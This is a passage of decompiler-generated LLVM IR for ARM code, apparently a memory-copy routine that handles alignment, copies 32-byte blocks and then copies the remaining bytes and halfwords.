dec_label_pc_fa34:                                ; preds = %entry
  %v0_fa34 = load i32, i32* @r1, align 4
  %v1_fa34 = sub i32 0, %v0_fa34
  %v1_fa38 = urem i32 %v1_fa34, 4
  store i32 %v1_fa38, i32* @r3, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fa38 = icmp eq i32 %v1_fa38, 0
  br i1 %v2_fa38, label %.thread1, label %dec_label_pc_fa40

dec_label_pc_fa40:                                ; preds = %dec_label_pc_fa34
  %v1_fa40 = and i32 %v1_fa34, 2
  %v2_fa40 = icmp ne i32 %v1_fa40, 0
  store i1 %v2_fa40, i1* %cpsr_c.global-to-local, align 1
  %v3_fa40 = shl i32 %v1_fa34, 31
  store i32 %v3_fa40, i32* %ip.global-to-local, align 4
  %v4_fa40 = icmp ne i32 %v3_fa40, 0
  store i1 %v4_fa40, i1* %cpsr_n.global-to-local, align 1
  %v2_fa44 = sub i32 %v0_fa2c, %v1_fa38
  store i32 %v2_fa44, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_fa38 to i8
  br i1 %v4_fa40, label %bb, label %bb127

bb:                                               ; preds = %dec_label_pc_fa40
  %v2_fa48 = inttoptr i32 %v0_fa34 to i8*
  %v3_fa48 = load i8, i8* %v2_fa48, align 1
  %v4_fa48 = zext i8 %v3_fa48 to i32
  store i32 %v4_fa48, i32* @r3, align 4
  %v6_fa48 = add i32 %v0_fa34, 1
  store i32 %v6_fa48, i32* @r1, align 4
  br label %bb127

bb127:                                            ; preds = %dec_label_pc_fa40, %bb
  %v1_fa54.off0 = phi i8 [ %extract.t, %dec_label_pc_fa40 ], [ %v3_fa48, %bb ]
  %v1_fa4c = phi i32 [ %v0_fa34, %dec_label_pc_fa40 ], [ %v6_fa48, %bb ]
  %extract.t190 = trunc i32 %v8_fa24 to i8
  br i1 %v2_fa40, label %bb128, label %.thread

bb128:                                            ; preds = %bb127
  %v2_fa4c = inttoptr i32 %v1_fa4c to i8*
  %v3_fa4c = load i8, i8* %v2_fa4c, align 1
  %v4_fa4c = zext i8 %v3_fa4c to i32
  store i32 %v4_fa4c, i32* @r4, align 4
  %v6_fa4c = add i32 %v1_fa4c, 1
  %v2_fa50 = inttoptr i32 %v6_fa4c to i8*
  %v3_fa50 = load i8, i8* %v2_fa50, align 1
  %v4_fa50 = zext i8 %v3_fa50 to i32
  store i32 %v4_fa50, i32* %ip.global-to-local, align 4
  %v6_fa50 = add i32 %v1_fa4c, 2
  store i32 %v6_fa50, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb127, %bb128
  %v1_fa58181.off0 = phi i8 [ %extract.t190, %bb127 ], [ %v3_fa4c, %bb128 ]
  br i1 %v4_fa40, label %bb129, label %bb130

bb129:                                            ; preds = %.thread
  %v4_fa54 = inttoptr i32 %v3_fa24 to i8*
  store i8 %v1_fa54.off0, i8* %v4_fa54, align 1
  %v5_fa54 = load i32, i32* %r0.global-to-local, align 4
  %v6_fa54 = add i32 %v5_fa54, 1
  store i32 %v6_fa54, i32* %r0.global-to-local, align 4
  %v0_fa58.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fa58.pre, label %bb129.bb131_crit_edge, label %.thread1

bb129.bb131_crit_edge:                            ; preds = %bb129
  %v1_fa58.pre = load i32, i32* @r4, align 4
  %extract.t188 = trunc i32 %v1_fa58.pre to i8
  br label %bb131

bb130:                                            ; preds = %.thread
  br i1 %v2_fa40, label %bb131, label %.thread1

bb131:                                            ; preds = %bb129.bb131_crit_edge, %bb130
  %v1_fa58.off0 = phi i8 [ %extract.t188, %bb129.bb131_crit_edge ], [ %v1_fa58181.off0, %bb130 ]
  %v3_fa5887 = phi i32 [ %v6_fa54, %bb129.bb131_crit_edge ], [ %v3_fa24, %bb130 ]
  %v4_fa58 = inttoptr i32 %v3_fa5887 to i8*
  store i8 %v1_fa58.off0, i8* %v4_fa58, align 1
  %v5_fa58 = load i32, i32* %r0.global-to-local, align 4
  %v6_fa58 = add i32 %v5_fa58, 1
  store i32 %v6_fa58, i32* %r0.global-to-local, align 4
  %v0_fa5c.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fa5c.pr, label %bb132, label %.thread1

bb132:                                            ; preds = %bb131
  %v1_fa5c = load i32, i32* %ip.global-to-local, align 4
  %v2_fa5c = trunc i32 %v1_fa5c to i8
  %v4_fa5c = inttoptr i32 %v6_fa58 to i8*
  store i8 %v2_fa5c, i8* %v4_fa5c, align 1
  %v5_fa5c = load i32, i32* %r0.global-to-local, align 4
  %v6_fa5c = add i32 %v5_fa5c, 1
  store i32 %v6_fa5c, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %bb129, %bb130, %dec_label_pc_fa34, %bb131, %bb132
  %v1_fa90 = phi i32 [ %v3_fa24, %bb130 ], [ %v3_fa24, %dec_label_pc_fa34 ], [ %v6_fa58, %bb131 ], [ %v6_fa5c, %bb132 ], [ %v6_fa54, %bb129 ]
  %v1_fa60 = load i32, i32* @r1, align 4
  %v2_fa60 = xor i32 %v1_fa60, %v1_fa90
  store i32 %v2_fa60, i32* @ip, align 4
  %v1_fa64 = urem i32 %v2_fa60, 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fa64 = icmp eq i32 %v1_fa64, 0
  br i1 %v2_fa64, label %dec_label_pc_fa6c, label %dec_label_pc_fb14

dec_label_pc_fa6c:                                ; preds = %.thread1
  %v2_fa6c = load i32, i32* @r5, align 4
  store i32 %v2_fa6c, i32* %stack_var_-40, align 4
  %v5_fa6c = load i32, i32* @r6, align 4
  %v8_fa6c = load i32, i32* @r7, align 4
  %v11_fa6c = load i32, i32* @r8, align 4
  %v14_fa6c = load i32, i32* @sb, align 4
  %v17_fa6c = load i32, i32* @sl, align 4
  %v20_fa6c = load i32, i32* @fp, align 4
  %v1_fa70 = sub i32 0, %v1_fa90
  %v1_fa74 = and i32 %v1_fa70, 28
  store i32 %v1_fa74, i32* @r3, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fa74 = icmp eq i32 %v1_fa74, 0
  %v0_faa8.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_fa74, label %dec_label_pc_faa8, label %dec_label_pc_fa7c

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_fa6c
  %v2_fa7c = sub i32 %v1_fa74, %v0_faa8.pre
  %v3_fa7c = icmp uge i32 %v1_fa74, %v0_faa8.pre
  store i1 %v3_fa7c, i1* %cpsr_c.global-to-local, align 1
  %v8_fa7c = icmp slt i32 %v2_fa7c, 0
  store i1 %v8_fa7c, i1* %cpsr_n.global-to-local, align 1
  %tmp196 = icmp ugt i32 %v1_fa74, %v0_faa8.pre
  br i1 %tmp196, label %bb133, label %bb134

bb133:                                            ; preds = %dec_label_pc_fa7c
  %v5_fa80 = and i32 %v0_faa8.pre, 28
  store i32 %v5_fa80, i32* @r3, align 4
  br label %bb134

bb134:                                            ; preds = %dec_label_pc_fa7c, %bb133
  %v0_fa84 = phi i32 [ %v1_fa74, %dec_label_pc_fa7c ], [ %v5_fa80, %bb133 ]
  %v1_fa84 = and i32 %v0_fa84, 16
  %v2_fa84 = icmp ne i32 %v1_fa84, 0
  store i1 %v2_fa84, i1* %cpsr_c.global-to-local, align 1
  %v3_fa84 = mul i32 %v0_fa84, 268435456
  store i32 %v3_fa84, i32* @ip, align 4
  %v4_fa84 = icmp slt i32 %v3_fa84, 0
  store i1 %v4_fa84, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_fa84, label %bb135, label %bb136

bb135:                                            ; preds = %bb134
  %v2_fa88 = inttoptr i32 %v1_fa60 to i32*
  %v3_fa88 = load i32, i32* %v2_fa88, align 4
  store i32 %v3_fa88, i32* @r4, align 4
  %v4_fa88 = add i32 %v1_fa60, 4
  %v5_fa88 = inttoptr i32 %v4_fa88 to i32*
  %v6_fa88 = load i32, i32* %v5_fa88, align 4
  store i32 %v6_fa88, i32* @r5, align 4
  %v7_fa88 = add i32 %v1_fa60, 8
  %v8_fa88 = inttoptr i32 %v7_fa88 to i32*
  %v9_fa88 = load i32, i32* %v8_fa88, align 4
  store i32 %v9_fa88, i32* @r6, align 4
  %v10_fa88 = add i32 %v1_fa60, 12
  %v11_fa88 = inttoptr i32 %v10_fa88 to i32*
  %v12_fa88 = load i32, i32* %v11_fa88, align 4
  store i32 %v12_fa88, i32* @r7, align 4
  %v13_fa88 = add i32 %v1_fa60, 16
  store i32 %v13_fa88, i32* @r1, align 4
  br i1 %v4_fa84, label %bb137, label %.thread88

bb136:                                            ; preds = %bb134
  br i1 %v4_fa84, label %bb137, label %.thread92

bb137:                                            ; preds = %bb136, %bb135
  %v1_fa8c = phi i32 [ %v13_fa88, %bb135 ], [ %v1_fa60, %bb136 ]
  %v2_fa8c = inttoptr i32 %v1_fa8c to i32*
  %v3_fa8c = load i32, i32* %v2_fa8c, align 4
  store i32 %v3_fa8c, i32* @r8, align 4
  %v4_fa8c = add i32 %v1_fa8c, 4
  %v5_fa8c = inttoptr i32 %v4_fa8c to i32*
  %v6_fa8c = load i32, i32* %v5_fa8c, align 4
  store i32 %v6_fa8c, i32* @sb, align 4
  %v7_fa8c = add i32 %v1_fa8c, 8
  store i32 %v7_fa8c, i32* @r1, align 4
  br i1 %v2_fa84, label %bb137..thread88_crit_edge, label %.thread90

bb137..thread88_crit_edge:                        ; preds = %bb137
  %v3_fa90.pre = load i32, i32* @r4, align 4
  br label %.thread88

.thread88:                                        ; preds = %bb137..thread88_crit_edge, %bb135
  %v3_fa90 = phi i32 [ %v3_fa90.pre, %bb137..thread88_crit_edge ], [ %v3_fa88, %bb135 ]
  %v2_fa90 = inttoptr i32 %v1_fa90 to i32*
  store i32 %v3_fa90, i32* %v2_fa90, align 4
  %v4_fa90 = add i32 %v1_fa90, 4
  %v5_fa90 = inttoptr i32 %v4_fa90 to i32*
  %v6_fa90 = load i32, i32* @r5, align 4
  store i32 %v6_fa90, i32* %v5_fa90, align 4
  %v7_fa90 = add i32 %v1_fa90, 8
  %v8_fa90 = inttoptr i32 %v7_fa90 to i32*
  %v9_fa90 = load i32, i32* @r6, align 4
  store i32 %v9_fa90, i32* %v8_fa90, align 4
  %v10_fa90 = add i32 %v1_fa90, 12
  %v11_fa90 = inttoptr i32 %v10_fa90 to i32*
  %v12_fa90 = load i32, i32* @r7, align 4
  store i32 %v12_fa90, i32* %v11_fa90, align 4
  %v13_fa90 = add i32 %v1_fa90, 16
  store i32 %v13_fa90, i32* %r0.global-to-local, align 4
  br i1 %v4_fa84, label %.thread88..thread90_crit_edge, label %.thread92

.thread88..thread90_crit_edge:                    ; preds = %.thread88
  %v3_fa94.pre = load i32, i32* @r8, align 4
  br label %.thread90

.thread90:                                        ; preds = %.thread88..thread90_crit_edge, %bb137
  %v3_fa94 = phi i32 [ %v3_fa94.pre, %.thread88..thread90_crit_edge ], [ %v3_fa8c, %bb137 ]
  %v1_fa9491 = phi i32 [ %v13_fa90, %.thread88..thread90_crit_edge ], [ %v1_fa90, %bb137 ]
  %v2_fa94 = inttoptr i32 %v1_fa9491 to i32*
  store i32 %v3_fa94, i32* %v2_fa94, align 4
  %v4_fa94 = add i32 %v1_fa9491, 4
  %v5_fa94 = inttoptr i32 %v4_fa94 to i32*
  %v6_fa94 = load i32, i32* @sb, align 4
  store i32 %v6_fa94, i32* %v5_fa94, align 4
  %v7_fa94 = add i32 %v1_fa9491, 8
  store i32 %v7_fa94, i32* %r0.global-to-local, align 4
  br label %.thread92

.thread92:                                        ; preds = %bb136, %.thread88, %.thread90
  %v2_faa0 = phi i32 [ %v13_fa90, %.thread88 ], [ %v7_fa94, %.thread90 ], [ %v1_fa90, %bb136 ]
  %v0_fa98 = load i32, i32* @r3, align 4
  %v1_fa98 = and i32 %v0_fa98, 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fa98 = icmp eq i32 %v1_fa98, 0
  br i1 %v2_fa98, label %.thread2, label %bb138

bb138:                                            ; preds = %.thread92
  %v1_fa9c = load i32, i32* @r1, align 4
  %v2_fa9c = inttoptr i32 %v1_fa9c to i32*
  %v3_fa9c = load i32, i32* %v2_fa9c, align 4
  store i32 %v3_fa9c, i32* %sl.global-to-local, align 4
  %v5_fa9c = add i32 %v1_fa9c, 4
  store i32 %v5_fa9c, i32* @r1, align 4
  %v3_faa0 = inttoptr i32 %v2_faa0 to i32*
  store i32 %v3_fa9c, i32* %v3_faa0, align 4
  %v4_faa0 = load i32, i32* %r0.global-to-local, align 4
  %v5_faa0 = add i32 %v4_faa0, 4
  store i32 %v5_faa0, i32* %r0.global-to-local, align 4
  %v1_faa4.pre = load i32, i32* @r3, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread92, %bb138
  %v0_fab864 = phi i32 [ %v2_faa0, %.thread92 ], [ %v5_faa0, %bb138 ]
  %v1_faa4 = phi i32 [ %v0_fa98, %.thread92 ], [ %v1_faa4.pre, %bb138 ]
  %v0_faa4 = load i32, i32* %r2.global-to-local, align 4
  %v2_faa4 = sub i32 %v0_faa4, %v1_faa4
  store i32 %v2_faa4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa6c, %.thread2
  %v0_fab863 = phi i32 [ %v0_fab864, %.thread2 ], [ %v1_fa90, %dec_label_pc_fa6c ]
  %v0_faa8 = phi i32 [ %v2_faa4, %.thread2 ], [ %v0_faa8.pre, %dec_label_pc_fa6c ]
  %v1_faa8 = add i32 %v0_faa8, -32
  store i32 %v1_faa8, i32* @r2, align 4
  %v2_faa8 = icmp ugt i32 %v0_faa8, 31
  store i1 %v2_faa8, i1* %cpsr_c.global-to-local, align 1
  %v6_faa8 = icmp slt i32 %v1_faa8, 0
  store i1 %v6_faa8, i1* %cpsr_n.global-to-local, align 1
  %v3_faac = icmp ult i32 %v1_faa8, 30
  br i1 %v3_faac, label %dec_label_pc_fac4, label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %dec_label_pc_faa8, %dec_label_pc_fab0.dec_label_pc_fab0_crit_edge
  %v0_fab8 = phi i32 [ %v24_fab8, %dec_label_pc_fab0.dec_label_pc_fab0_crit_edge ], [ %v0_fab863, %dec_label_pc_faa8 ]
  %v0_fab4 = phi i32 [ %v0_fab4.pre, %dec_label_pc_fab0.dec_label_pc_fab0_crit_edge ], [ %v1_faa8, %dec_label_pc_faa8 ]
  %v0_fab0 = load i32, i32* @r1, align 4
  %v1_fab0 = inttoptr i32 %v0_fab0 to i32*
  %v2_fab0 = load i32, i32* %v1_fab0, align 4
  store i32 %v2_fab0, i32* @r4, align 4
  %v3_fab0 = add i32 %v0_fab0, 4
  %v4_fab0 = inttoptr i32 %v3_fab0 to i32*
  %v5_fab0 = load i32, i32* %v4_fab0, align 4
  store i32 %v5_fab0, i32* @r5, align 4
  %v6_fab0 = add i32 %v0_fab0, 8
  %v7_fab0 = inttoptr i32 %v6_fab0 to i32*
  %v8_fab0 = load i32, i32* %v7_fab0, align 4
  store i32 %v8_fab0, i32* @r6, align 4
  %v9_fab0 = add i32 %v0_fab0, 12
  %v10_fab0 = inttoptr i32 %v9_fab0 to i32*
  %v11_fab0 = load i32, i32* %v10_fab0, align 4
  store i32 %v11_fab0, i32* @r7, align 4
  %v12_fab0 = add i32 %v0_fab0, 16
  %v13_fab0 = inttoptr i32 %v12_fab0 to i32*
  %v14_fab0 = load i32, i32* %v13_fab0, align 4
  store i32 %v14_fab0, i32* @r8, align 4
  %v15_fab0 = add i32 %v0_fab0, 20
  %v16_fab0 = inttoptr i32 %v15_fab0 to i32*
  %v17_fab0 = load i32, i32* %v16_fab0, align 4
  store i32 %v17_fab0, i32* @sb, align 4
  %v18_fab0 = add i32 %v0_fab0, 24
  %v19_fab0 = inttoptr i32 %v18_fab0 to i32*
  %v20_fab0 = load i32, i32* %v19_fab0, align 4
  store i32 %v20_fab0, i32* %sl.global-to-local, align 4
  %v21_fab0 = add i32 %v0_fab0, 28
  %v22_fab0 = inttoptr i32 %v21_fab0 to i32*
  %v23_fab0 = load i32, i32* %v22_fab0, align 4
  store i32 %v23_fab0, i32* %fp.global-to-local, align 4
  %v24_fab0 = add i32 %v0_fab0, 32
  store i32 %v24_fab0, i32* @r1, align 4
  %v1_fab4 = add i32 %v0_fab4, -32
  store i32 %v1_fab4, i32* %r2.global-to-local, align 4
  %v2_fab4 = icmp ugt i32 %v0_fab4, 31
  %v1_fab8 = inttoptr i32 %v0_fab8 to i32*
  store i32 %v2_fab0, i32* %v1_fab8, align 4
  %v3_fab8 = add i32 %v0_fab8, 4
  %v4_fab8 = inttoptr i32 %v3_fab8 to i32*
  %v5_fab8 = load i32, i32* @r5, align 4
  store i32 %v5_fab8, i32* %v4_fab8, align 4
  %v6_fab8 = add i32 %v0_fab8, 8
  %v7_fab8 = inttoptr i32 %v6_fab8 to i32*
  %v8_fab8 = load i32, i32* @r6, align 4
  store i32 %v8_fab8, i32* %v7_fab8, align 4
  %v9_fab8 = add i32 %v0_fab8, 12
  %v10_fab8 = inttoptr i32 %v9_fab8 to i32*
  %v11_fab8 = load i32, i32* @r7, align 4
  store i32 %v11_fab8, i32* %v10_fab8, align 4
  %v12_fab8 = add i32 %v0_fab8, 16
  %v13_fab8 = inttoptr i32 %v12_fab8 to i32*
  %v14_fab8 = load i32, i32* @r8, align 4
  store i32 %v14_fab8, i32* %v13_fab8, align 4
  %v15_fab8 = add i32 %v0_fab8, 20
  %v16_fab8 = inttoptr i32 %v15_fab8 to i32*
  %v17_fab8 = load i32, i32* @sb, align 4
  store i32 %v17_fab8, i32* %v16_fab8, align 4
  %v18_fab8 = add i32 %v0_fab8, 24
  %v19_fab8 = inttoptr i32 %v18_fab8 to i32*
  %v20_fab8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v20_fab8, i32* %v19_fab8, align 4
  %v21_fab8 = add i32 %v0_fab8, 28
  %v22_fab8 = inttoptr i32 %v21_fab8 to i32*
  %v23_fab8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v23_fab8, i32* %v22_fab8, align 4
  %v24_fab8 = add i32 %v0_fab8, 32
  store i32 %v24_fab8, i32* %r0.global-to-local, align 4
  br i1 %v2_fab4, label %dec_label_pc_fab0.dec_label_pc_fab0_crit_edge, label %dec_label_pc_fac0

dec_label_pc_fab0.dec_label_pc_fab0_crit_edge:    ; preds = %dec_label_pc_fab0
  %v0_fab4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fab0

dec_label_pc_fac0:                                ; preds = %dec_label_pc_fab0
  %v6_fab4 = icmp slt i32 %v1_fab4, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_fab4, i1* %cpsr_n.global-to-local, align 1
  %v0_fac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_fac0 = add i32 %v0_fac0, 32
  store i32 %v1_fac0, i32* @r2, align 4
  br label %dec_label_pc_fac4

dec_label_pc_fac4:                                ; preds = %dec_label_pc_faa8, %dec_label_pc_fac0
  %v1_fad8 = phi i32 [ %v0_fab863, %dec_label_pc_faa8 ], [ %v24_fab8, %dec_label_pc_fac0 ]
  %v0_facc = phi i32 [ %v1_faa8, %dec_label_pc_faa8 ], [ %v1_fac0, %dec_label_pc_fac0 ]
  %v1_fac4 = urem i32 %v0_facc, 32
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_fac4 = icmp eq i32 %v1_fac4, 0
  br i1 %v2_fac4, label %.thread3, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_fac4
  %v1_facc = and i32 %v0_facc, 16
  %v2_facc = icmp ne i32 %v1_facc, 0
  store i1 %v2_facc, i1* %cpsr_c.global-to-local, align 1
  %v3_facc = mul i32 %v0_facc, 268435456
  store i32 %v3_facc, i32* %ip.global-to-local, align 4
  %v4_facc = icmp slt i32 %v3_facc, 0
  store i1 %v4_facc, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_facc, label %bb139, label %bb140

bb139:                                            ; preds = %dec_label_pc_facc
  %v1_fad0 = load i32, i32* @r1, align 4
  %v2_fad0 = inttoptr i32 %v1_fad0 to i32*
  %v3_fad0 = load i32, i32* %v2_fad0, align 4
  store i32 %v3_fad0, i32* @r4, align 4
  %v4_fad0 = add i32 %v1_fad0, 4
  %v5_fad0 = inttoptr i32 %v4_fad0 to i32*
  %v6_fad0 = load i32, i32* %v5_fad0, align 4
  store i32 %v6_fad0, i32* @r5, align 4
  %v7_fad0 = add i32 %v1_fad0, 8
  %v8_fad0 = inttoptr i32 %v7_fad0 to i32*
  %v9_fad0 = load i32, i32* %v8_fad0, align 4
  store i32 %v9_fad0, i32* @r6, align 4
  %v10_fad0 = add i32 %v1_fad0, 12
  %v11_fad0 = inttoptr i32 %v10_fad0 to i32*
  %v12_fad0 = load i32, i32* %v11_fad0, align 4
  store i32 %v12_fad0, i32* @r7, align 4
  %v13_fad0 = add i32 %v1_fad0, 16
  store i32 %v13_fad0, i32* @r1, align 4
  br i1 %v4_facc, label %bb141, label %.thread93

bb140:                                            ; preds = %dec_label_pc_facc
  br i1 %v4_facc, label %._crit_edge, label %.thread97

._crit_edge:                                      ; preds = %bb140
  %v1_fad4.pre = load i32, i32* @r1, align 4
  br label %bb141

bb141:                                            ; preds = %bb139, %._crit_edge
  %v1_fad4 = phi i32 [ %v1_fad4.pre, %._crit_edge ], [ %v13_fad0, %bb139 ]
  %v2_fad4 = inttoptr i32 %v1_fad4 to i32*
  %v3_fad4 = load i32, i32* %v2_fad4, align 4
  store i32 %v3_fad4, i32* @r8, align 4
  %v4_fad4 = add i32 %v1_fad4, 4
  %v5_fad4 = inttoptr i32 %v4_fad4 to i32*
  %v6_fad4 = load i32, i32* %v5_fad4, align 4
  store i32 %v6_fad4, i32* @sb, align 4
  %v7_fad4 = add i32 %v1_fad4, 8
  store i32 %v7_fad4, i32* @r1, align 4
  br i1 %v2_facc, label %bb141..thread93_crit_edge, label %.thread95

bb141..thread93_crit_edge:                        ; preds = %bb141
  %v3_fad8.pre = load i32, i32* @r4, align 4
  br label %.thread93

.thread93:                                        ; preds = %bb141..thread93_crit_edge, %bb139
  %v3_fad8 = phi i32 [ %v3_fad8.pre, %bb141..thread93_crit_edge ], [ %v3_fad0, %bb139 ]
  %v2_fad8 = inttoptr i32 %v1_fad8 to i32*
  store i32 %v3_fad8, i32* %v2_fad8, align 4
  %v4_fad8 = add i32 %v1_fad8, 4
  %v5_fad8 = inttoptr i32 %v4_fad8 to i32*
  %v6_fad8 = load i32, i32* @r5, align 4
  store i32 %v6_fad8, i32* %v5_fad8, align 4
  %v7_fad8 = add i32 %v1_fad8, 8
  %v8_fad8 = inttoptr i32 %v7_fad8 to i32*
  %v9_fad8 = load i32, i32* @r6, align 4
  store i32 %v9_fad8, i32* %v8_fad8, align 4
  %v10_fad8 = add i32 %v1_fad8, 12
  %v11_fad8 = inttoptr i32 %v10_fad8 to i32*
  %v12_fad8 = load i32, i32* @r7, align 4
  store i32 %v12_fad8, i32* %v11_fad8, align 4
  %v13_fad8 = add i32 %v1_fad8, 16
  store i32 %v13_fad8, i32* %r0.global-to-local, align 4
  br i1 %v4_facc, label %.thread93..thread95_crit_edge, label %.thread97

.thread93..thread95_crit_edge:                    ; preds = %.thread93
  %v3_fadc.pre = load i32, i32* @r8, align 4
  br label %.thread95

.thread95:                                        ; preds = %.thread93..thread95_crit_edge, %bb141
  %v3_fadc = phi i32 [ %v3_fadc.pre, %.thread93..thread95_crit_edge ], [ %v3_fad4, %bb141 ]
  %v1_fadc96 = phi i32 [ %v13_fad8, %.thread93..thread95_crit_edge ], [ %v1_fad8, %bb141 ]
  %v2_fadc = inttoptr i32 %v1_fadc96 to i32*
  store i32 %v3_fadc, i32* %v2_fadc, align 4
  %v4_fadc = add i32 %v1_fadc96, 4
  %v5_fadc = inttoptr i32 %v4_fadc to i32*
  %v6_fadc = load i32, i32* @sb, align 4
  store i32 %v6_fadc, i32* %v5_fadc, align 4
  %v7_fadc = add i32 %v1_fadc96, 8
  store i32 %v7_fadc, i32* %r0.global-to-local, align 4
  br label %.thread97

.thread97:                                        ; preds = %bb140, %.thread93, %.thread95
  %v2_faec = phi i32 [ %v13_fad8, %.thread93 ], [ %v7_fadc, %.thread95 ], [ %v1_fad8, %bb140 ]
  %v0_fae0 = load i32, i32* @r2, align 4
  %v1_fae0 = and i32 %v0_fae0, 4
  %v2_fae0 = icmp ne i32 %v1_fae0, 0
  store i1 %v2_fae0, i1* %cpsr_c.global-to-local, align 1
  %v3_fae0 = mul i32 %v0_fae0, 1073741824
  store i32 %v3_fae0, i32* @ip, align 4
  %v4_fae0 = icmp slt i32 %v3_fae0, 0
  store i1 %v4_fae0, i1* %cpsr_n.global-to-local, align 1
  br i1 %v2_fae0, label %bb142, label %bb143

bb142:                                            ; preds = %.thread97
  %v1_fae4 = load i32, i32* @r1, align 4
  %v2_fae4 = inttoptr i32 %v1_fae4 to i32*
  %v3_fae4 = load i32, i32* %v2_fae4, align 4
  store i32 %v3_fae4, i32* @r3, align 4
  %v5_fae4 = add i32 %v1_fae4, 4
  store i32 %v5_fae4, i32* @r1, align 4
  br i1 %v4_fae0, label %.thread108, label %bb144

.thread108:                                       ; preds = %bb142
  %v2_fae8101 = inttoptr i32 %v5_fae4 to i16*
  %v3_fae8102 = load i16, i16* %v2_fae8101, align 2
  %v4_fae8103 = zext i16 %v3_fae8102 to i32
  store i32 %v4_fae8103, i32* %r4.global-to-local, align 4
  %v6_fae8104 = add i32 %v1_fae4, 2
  store i32 %v6_fae8104, i32* @r1, align 4
  %v3_faec110 = inttoptr i32 %v2_faec to i32*
  store i32 %v3_fae4, i32* %v3_faec110, align 4
  %v4_faec111 = load i32, i32* %r0.global-to-local, align 4
  %v5_faec112 = add i32 %v4_faec111, 4
  store i32 %v5_faec112, i32* %r0.global-to-local, align 4
  %v1_faf0.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t195 = trunc i32 %v1_faf0.pre to i16
  br label %bb145

bb143:                                            ; preds = %.thread97
  br i1 %v4_fae0, label %.thread105, label %.thread107

.thread105:                                       ; preds = %bb143
  %v1_fae8.pre = load i32, i32* @r1, align 4
  %v2_fae8 = inttoptr i32 %v1_fae8.pre to i16*
  %v3_fae8 = load i16, i16* %v2_fae8, align 2
  %v4_fae8 = zext i16 %v3_fae8 to i32
  store i32 %v4_fae8, i32* %r4.global-to-local, align 4
  %v6_fae8 = add i32 %v1_fae8.pre, -2
  store i32 %v6_fae8, i32* @r1, align 4
  br label %bb145

bb144:                                            ; preds = %bb142
  %v3_faec = inttoptr i32 %v2_faec to i32*
  store i32 %v3_fae4, i32* %v3_faec, align 4
  %v4_faec = load i32, i32* %r0.global-to-local, align 4
  %v5_faec = add i32 %v4_faec, 4
  store i32 %v5_faec, i32* %r0.global-to-local, align 4
  br label %.thread107

bb145:                                            ; preds = %.thread108, %.thread105
  %v1_faf0.off0 = phi i16 [ %v3_fae8, %.thread105 ], [ %extract.t195, %.thread108 ]
  %v3_faf0106 = phi i32 [ %v2_faec, %.thread105 ], [ %v5_faec112, %.thread108 ]
  %v4_faf0 = inttoptr i32 %v3_faf0106 to i16*
  store i16 %v1_faf0.off0, i16* %v4_faf0, align 2
  %v5_faf0 = load i32, i32* %r0.global-to-local, align 4
  %v6_faf0 = add i32 %v5_faf0, -2
  store i32 %v6_faf0, i32* %r0.global-to-local, align 4
  br label %.thread107

.thread107:                                       ; preds = %bb143, %bb144, %bb145
  %v3_fafc = phi i32 [ %v5_faec, %bb144 ], [ %v6_faf0, %bb145 ], [ %v2_faec, %bb143 ]
  %v0_faf4 = load i32, i32* @r2, align 4
  %v1_faf4 = urem i32 %v0_faf4, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_faf4 = icmp eq i32 %v1_faf4, 0
  br i1 %v2_faf4, label %.thread3, label %bb146

bb146:                                            ; preds = %.thread107
  %v1_faf8 = load i32, i32* @r1, align 4
  %v2_faf8 = inttoptr i32 %v1_faf8 to i8*
  %v3_faf8 = load i8, i8* %v2_faf8, align 1
  %v4_faf8 = zext i8 %v3_faf8 to i32
  store i32 %v4_faf8, i32* @r3, align 4
  %v4_fafc = inttoptr i32 %v3_fafc to i8*
  store i8 %v3_faf8, i8* %v4_fafc, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread107, %dec_label_pc_fac4, %bb146
  %v2_fb00 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_fb00, i32* @r5, align 4
  store i32 %v5_fa6c, i32* @r6, align 4
  store i32 %v8_fa6c, i32* @r7, align 4
  store i32 %v11_fa6c, i32* @r8, align 4
  store i32 %v14_fa6c, i32* @sb, align 4
  store i32 %v17_fa6c, i32* @sl, align 4
  store i32 %v20_fa6c, i32* @fp, align 4
  store i32 %v3_fa24, i32* %r0.global-to-local, align 4
  store i32 %v8_fa24, i32* @r4, align 4
  store i32 %v11_fa24, i32* @lr, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  ret i32 %v3_fa24

dec_label_pc_fb14:                                ; preds = %.thread1
  %v0_fb14 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb14 = add i32 %v0_fb14, -4
  %v2_fb14 = icmp ugt i32 %v0_fb14, 3
  store i1 %v2_fb14, i1* %cpsr_c.global-to-local, align 1
  %v6_fb14 = icmp slt i32 %v1_fb14, 0
  store i1 %v6_fb14, i1* %cpsr_n.global-to-local, align 1
  %v3_fb18 = icmp ult i32 %v0_fb14, 2
  br i1 %v3_fb18, label %dec_label_pc_fd00, label %dec_label_pc_fb1c

dec_label_pc_fb1c:                                ; preds = %dec_label_pc_fb14
